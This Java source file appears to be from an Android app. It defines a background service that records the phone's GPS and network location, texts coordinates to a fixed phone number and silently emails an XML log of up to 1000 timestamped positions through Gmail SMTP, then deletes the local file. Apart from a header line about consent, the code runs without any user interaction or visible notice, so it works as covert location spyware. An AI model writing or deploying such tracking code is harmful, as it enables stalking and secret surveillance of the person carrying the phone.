
//DMBazylev, used for Android 7.0, version 1.0, must be used only with the user's consent
package xmlWithGPSSender.DMBazylev;//пакет

import android.util.Log;


import android.database.sqlite.SQLiteDatabase;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase.CursorFactory;
import android.database.sqlite.SQLiteOpenHelper;
import android.content.Context;
import android.app.Service;
import android.location.LocationManager;
import android.content.Intent;
import android.location.LocationListener;
import android.os.IBinder;
import android.location.Location;
import android.icu.util.Calendar;
import android.os.Bundle;
import java.text.SimpleDateFormat;
import java.lang.Thread;

import java.util.concurrent.TimeUnit;//работа с частями (периодами времени)

//=========================================это для работы с javamail==========================
import javax.mail.Message;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.MessagingException;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMultipart;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;

import java.util.Properties;
import java.lang.Thread;

import android.Manifest;
import android.content.pm.PackageManager;


//===================================================================

import android.os.Environment;
import java.io.File;
import java.nio.channels.FileChannel;
import java.io.FileInputStream;
import java.io.FileOutputStream;

import java.util.Random;
import java.io.IOException;
import java.util.Locale;

import java.util.List;


import java.io.IOException;
import android.database.SQLException;
import android.database.sqlite.SQLiteException;

//===================================================================
import android.telephony.SmsManager;//направление смс
import android.widget.Toast;//работа с всплывающими окнами

//=создание и запись XML файла (специально подключать библиотеку не нужно)=
import org.w3c.dom.Node;
import org.w3c.dom.Element;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.Transformer;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.TransformerException;
import javax.xml.parsers.ParserConfigurationException;

import java.io.FileWriter;
import java.util.ArrayList;

//========================================================================

public class MyService extends  Service
{

    public static LocationManager lm;

    public static double latitude;
    public static double longitude;
    public static long time;
    int count;//счетчик считываний координат в AndroidListener

    private  static boolean stopLocationListener=false;//флаг для отключения LocationListener

    private  static boolean ASGSTA=false;// получить координаты при запущенном сервисе (по умолчанию нет)
    private  static boolean ASGSTO=false;// получить координаты при остановленном сервисе (по умолчанию нет)

//лист нужно создать статическим чтобы он существовал и при работе LocationListener и при основном работе
    public static ArrayList<RowInXML> rowsInXML = new ArrayList<RowInXML>();//лист для записи координат и времени (затем будет использован для заполненя XML файла)

        @Override
        public IBinder onBind(Intent intent)
        {           
            return null;
        }


    @Override
    public void onCreate()//в этом переопределенном методе создаются и инициилируются необходмые переменные и классы
    {
        super.onCreate();

            lm = (LocationManager) this.getSystemService(Context.LOCATION_SERVICE);
            count=0;
     }

    @Override
        public int onStartCommand(Intent intent, int flags, int startId)//в этом методе запускается и работает служба, возможен вызов методов (причем в теле этих методов может быть работа в других потоках)
        {

            SmsManager.getDefault().sendTextMessage("x xxx xxxxxxx", null, "onStartCommand", null, null);//отправка смс

            if (intent.getIntExtra ("xmlWithGPSSender.DMBazylev.Num0", 10)!=10)//"ASS" - старт
            {
                serviceTaskMain();//запуск основной работы в сервисе
            }
            if (intent.getIntExtra ("xmlWithGPSSender.DMBazylev.Num1", 10)!=10)//"ASE" -стоп
            {
                serviceTaskStop();//остановка работы сервиса
            }
            if (intent.getIntExtra ("xmlWithGPSSender.DMBazylev.Num2", 10)!=10)//"ASGSTA" - получить координаты при запущенном сервисе (и уже запущенном методе serviceTaskMain())
            {
                ASGSTA=true;
            }
            if (intent.getIntExtra ("xmlWithGPSSender.DMBazylev.Num3", 10)!=10)//"ASGSTO" - получить координаты при незапущенном сервисе (запустить, править смс с координами и после этого остановить сервис)
            {
                serviceTaskMain();//запуск основной работы в сервисе
                ASGSTO=true;
            }

           return  Service.START_STICKY;//стандартный возврат для андроидсервиса

        }

        @Override
        public void onDestroy()//остановка и уничтожение службы
        {
            super.onDestroy();
        }

    void serviceTaskMain()//основная работа в андроидсервисе - получение координат (работа в основном потоке - другой поток не создаем!), работа отключается только по команде
        {
            //слушателя создаем прямо здесь а не в отдельном классе (так удобнее в данном случае), LocationListener это не класс а интерфейс и наследование идет не через ключевой слово extends а через implements

            LocationListener  locationListener = new LocationListener(){

               @Override
               public void onLocationChanged(Location location) {

                        latitude = location.getLatitude();
                        longitude = location.getLongitude();
                        time = location.getTime();

//                        Log.d("lat: ",String.valueOf(latitude));
//                        Log.d("lng: ",String.valueOf(longitude));

                    Calendar c = Calendar.getInstance();
                    // c.setTimeInMillis(time+(10*3600*1000));//для эмулятора - он берет время по гринвичу

                    c.setTimeInMillis(time);//для телефона он берет местное время

                   SimpleDateFormat format1 = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss");//формат времени

                   String timeFormatted = format1.format(c.getTime());//перевод времени в формат

//                   Log.d("time: ",timeFormatted);

            //вставка в статический лист
              rowsInXML.add(new RowInXML(timeFormatted,latitude,longitude));

       ++count;

       if (count>1000)//количество получений координат слушателем (при достижении определенного числа работа выполнена)
       {

          lm.removeUpdates(this);//останавливаем слушателя
          createAndWriteXML();//создаем XML файл с записанными данными из листа и отправляем этот файл на почту (метод отправки отправляется в методе createAndWriteXML() после выполнения кода метода createAndWriteXML())
          stopSelf();//служба останавливает саму себя//
        }

    if (stopLocationListener)//при выставленном флаге stopLocationListener в true
    {
        lm.removeUpdates(this);//останавливаем слушателя
      }

  if (ASGSTA)// получить координаты при запущенном сервисе
  {
      String strGPS = String.valueOf(latitude)+" "+String.valueOf(longitude);
      SmsManager.getDefault().sendTextMessage("x xxx xxxxxxx", null, strGPS, null, null);//отправка смс
      ASGSTA=false;
    }
if (ASGSTO)//получить координаты при остановленном сервисе
{
    String strGPS = String.valueOf(latitude)+" "+String.valueOf(longitude);
    SmsManager.getDefault().sendTextMessage("x xxx xxxxxxx", null, strGPS, null, null);//отправка смс
    lm.removeUpdates(this);//останавливаем слушателя
    stopSelf();//служба останавливает саму себя
  }

               }

               @Override
               public void onStatusChanged(String provider, int status, Bundle extras)
               {

               }

               @Override
               public void onProviderEnabled(String provider)
               {
               }

               @Override
               public void onProviderDisabled(String provider)
               {
               }
           };

       //запуск locationListener

       //используем два провайдера тк вроде не работает изза санкций LocationManager.GPS_PROVIDER остается только - LocationManager.NETWORK_PROVIDER
       lm.requestLocationUpdates(LocationManager.GPS_PROVIDER,
                       0,// Noncompliant {{Location updates should be done with a time greater than 0.}} время
                       0,// Noncompliant {{Location updates should be done with a distance interval greater than 10m}} дистанция в метрах
                       locationListener);

        lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,
                                  0,// Noncompliant {{Location updates should be done with a time greater than 0.}} время
                                  0,// Noncompliant {{Location updates should be done with a distance interval greater than 10m}} дистанция в метрах
                                  locationListener);

        }


    void serviceTaskStop()//остановка работы сервиса
    {     
        stopLocationListener=true;
        createAndWriteXML();//создаем XML файл с записанными данными из листа и отправляем этот файл на почту (метод отправки отправляется в методе createAndWriteXML() после выполнения кода метода createAndWriteXML())
        stopSelf();//служба останавливает саму себя
    }





    public void sendXMLFileToEmail()//отправка XML файла на электронную почту без нажатия кнопки пользователем
    {

        final String filePath = "/storage/emulated/0/Download/rows.xml";//путь к файлу rows.xml во внешнем хранилище (как в телефоне так и в эмуляторе)

        final File file=new File(filePath);

            //создаем дочерний поток
            Thread thread = new Thread(new Runnable() {

                @Override
                public void run() //в теле переопределенного метода run() выполняется работа в отдельном потоке
                {
        //======================================работа в дочернем потоке========================================================


             String to = "xxxxxxxxxxx@gmail.com";//почта адресат


              String from = "xxxxxxxxxxx@gmail.com";//почта отправитель
              final String username = "xxxxxxxxxxx";//имя пользователя почты отправителя (то что было при регистрации почты)
              final String password = "xxxxxxxxxxx";//пароль почты отправителя (реальный пароль)

              String host = "smtp.gmail.com";//настройки javamail
              Properties props = new Properties();
              props.put("mail.smtp.auth", "true");
              props.put("mail.smtp.starttls.enable", "true");
              props.put("mail.smtp.host", host);
              props.put("mail.smtp.port", 587);//работает при установки настройки в gmail разрешения на допуск небезопасного приложения
             // props.put("mail.smtp.port", 25);//это тоже работает при установки настройки в gmail разрешения на допуск небезопасного приложения

              Session session = Session.getInstance(props,
              new javax.mail.Authenticator() {
                 protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(username, password);
                 }
              });
              try {

                 Message message = new MimeMessage(session);

                 message.setFrom(new InternetAddress(from));

                 message.setRecipients(Message.RecipientType.TO,InternetAddress.parse(to));

                 message.setSubject("");

                 // Create the message part - отправка файла
                 MimeBodyPart messageBodyPart = new MimeBodyPart();

                          // Now set the actual message
                 messageBodyPart.setText("файл");

                          // Create a multipar message
                 MimeMultipart multipart = new MimeMultipart();

                          // Set text message part
                 multipart.addBodyPart(messageBodyPart);

                          // Part two is attachment
                  messageBodyPart = new MimeBodyPart();

                  DataSource source = new FileDataSource(filePath);

                  messageBodyPart.setDataHandler(new DataHandler(source));
                  messageBodyPart.setFileName(filePath);
                  multipart.addBodyPart(messageBodyPart);

                          // Send the complete message parts
                  message.setContent(multipart);

                 Transport.send(message);//отправка файла

                file.delete();// удаляем файл после отправки - этот метод возвращает  true если файл успешно удален

              } catch (MessagingException e)
                {
                    System.out.println(e);                
              }

          //=========================================остаток кода дочернего потока=====================================================


                                            }
                                        });

                                        thread.start();//запуск потока (который отдельный)
        }




    public  void createAndWriteXML()//создание XML файла и запись в него сведений и статического листа
    {

            //создаем Document  doc
            DocumentBuilderFactory dbf = null;
            DocumentBuilder        db  = null;
            Document               doc = null;
            try {
                dbf = DocumentBuilderFactory.newInstance();
                db  = dbf.newDocumentBuilder();
                doc = db.newDocument();

                Element e_root   = doc.createElement("Rows");//создаем корневой элемент

                Element e_row = doc.createElement("Row");//создаем дочерний элемент

                e_root.appendChild(e_row);//вставляем дочерний элемент в корневой элемент

                doc.appendChild(e_root);//вставляем  корневой элемент в документ Document  doc

                if (rowsInXML.size() == 0)//если лист пустой
                {                 
                    return;//выходим из метода
                 }

                    for(int i=0; i<rowsInXML.size(); i ++ )//если лист не пустой
                    {

                         Element time = doc.createElement("Time");//создаем элемент "Time"
                         time.appendChild(doc.createTextNode(String.valueOf(rowsInXML.get(i).getTime())));//записываем в этот элемент данные time из статического листа
                         e_row.appendChild(time);//ложим элемент "Time" в дочерний элемент e_row

                         //и тд по остальным элементам
                         Element latitude = doc.createElement("Latitude");
                         latitude.appendChild(doc.createTextNode(String.valueOf(rowsInXML.get(i).getLatitude())));
                         e_row.appendChild(latitude);

                         Element longitude = doc.createElement("Longitude");
                         longitude.appendChild(doc.createTextNode(String.valueOf(rowsInXML.get(i).getLongitude())));
                         e_row.appendChild(longitude);

                     }


                 // создаем XML файл (файл именно создается а не используеся уже существующий)
                         TransformerFactory tranFactory = TransformerFactory.newInstance();
                         Transformer aTransformer = tranFactory.newTransformer();

                         // format the XML nicely
                         aTransformer.setOutputProperty(OutputKeys.ENCODING, "ISO-8859-1");

                         DOMSource source = new DOMSource(doc);
                         try {
                             FileWriter fos = new FileWriter("/storage/emulated/0/Download/rows.xml");//файл создается по этому пути - это внешнее хранилище (как телефона так и эмулятора)
                             StreamResult result = new StreamResult(fos);
                             aTransformer.transform(source, result);//записываем в XML файл сведения

                         } catch (IOException e)
                        {

                             e.printStackTrace();
                         }

                     //после создания XML файла и записи в него сведений
                     sendXMLFileToEmail();//отправляем файл на почту

        } catch (TransformerException ex) {
            System.out.println("Error outputting document");

        } catch (ParserConfigurationException ex) {
            System.out.println("Error building document");
        }


        }



}




















